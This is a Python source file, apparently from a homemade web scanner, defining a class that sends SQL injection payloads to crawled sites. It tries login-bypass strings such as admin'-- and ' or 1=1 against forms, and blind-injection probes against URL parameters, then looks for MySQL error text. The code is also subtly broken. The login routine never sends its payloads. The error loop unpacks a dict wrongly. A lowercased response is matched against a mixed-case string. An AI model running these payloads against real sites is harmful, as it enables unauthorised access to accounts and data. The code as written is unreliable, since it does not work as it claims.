__version__ = "0.1"
__copyright__ = "CopyRight (C) 2015 by Jonathan Castro"
__license__ = "Proprietary"
__author__ = "Jonathan Castro"
__author_email__ = "Jonathan Castro, jonathancastrogonzalez at gmail dot com"

import requests
import urllib.parse
from bs4 import BeautifulSoup

from App.core.url import URL
from App.core.url_list import URLlist

# For normal injection; search for login forms, try and if the login form is still there, that injection didn't work.

class SQLInjection(object):
    def __init__(self, url_list):
        if url_list is None:
            self.url_list = URLlist()
        else:
            self.url_list = url_list

        # http://stackoverflow.com/questions/9626535/get-domain-name-from-url
        # self.domain = "{0.scheme}://{0.netloc}/".format(urllib.parse.urlsplit(url))

        self.input_data = [
            urllib.parse.urlencode({
                'username': 'admin\'--',
                'password': '123456789'}),
            urllib.parse.urlencode({
                'username': '\' or 1=1',
                'password': '123456789'}),
            urllib.parse.urlencode({
                'username': 'admin',
                'password': '\'or \'1\'=\'1'}),
        ]

        self.blind_param_data = [
            'A%\'--',
            'A%\' and 1=1--',
            'A%\' and 1=2--'
        ]

        # self.serialized_param_data = []

        self.sql_errors = {
            'MySQL': 'error in your SQL syntax'
        }

    def search_injections(self):
        while True:
            url = self.url_list.get_url()
            if url is None or type(url) is not URL:
                break
            self.__signin_attemp(url)
            self.__blind_sqli(url)
            # self.__serialized_sqli(url)
        return False

    def __signin_attemp(self, url):
        soup = url.get_content()
        forms = soup('form')
        for form in forms:
            action = form.get("action")
            inputs = form('input')
            if len(inputs) == 2:
                data = []
                for input in inputs:
                    data.append(input.get("name"))
                r = requests.post(action, data=urllib.parse.urlencode(data))
                response = r.text
        return False

    def __blind_sqli(self, url):
        params = self.__get_parameters(url.get_url())
        domain = "{0.scheme}://{0.netloc}/".format(urllib.parse.urlsplit(url.get_url()))
        for x, y in params:
            for p in self.blind_param_data:
                data = {
                    x: p
                }
                r = requests.post(domain, data=urllib.parse.urlencode(data))
                response = r.text
                for t, e in self.sql_errors:
                    if e in response.lower():
                        return True
        return False

    def __serialized_sqli(self, url):
        # params = self.__get_parameters(url)
        return False

    def __get_parameters(self, url):
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qsl(parsed.query)
        return params
